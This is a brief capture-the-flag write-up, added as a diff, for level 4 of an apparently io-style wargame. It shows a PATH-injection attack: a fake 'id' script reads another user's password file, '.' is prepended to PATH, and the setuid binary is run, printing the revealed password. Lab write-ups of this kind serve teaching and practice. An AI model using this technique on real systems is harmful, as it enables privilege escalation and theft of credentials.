@@ -1,0 +1,9 @@
+Simple path injection. App calls system("id") and we just make sure it finds our 'id' before it finds the system one by inserting '.' into the path before any other location.
+
+level4@io:~$ mkdir /tmp/xxxll04
+level4@io:~$ cd /tmp/xxxll04
+level4@io:/tmp/xxxll04$ echo "cat /home/level5/.pass" > id
+level4@io:/tmp/xxxll04$ chmod 777 id
+level4@io:/tmp/xxxll04$ export PATH=.:$PATH
+level4@io:/tmp/xxxll04$ /levels/level04
+RAhK8VOfcVYV
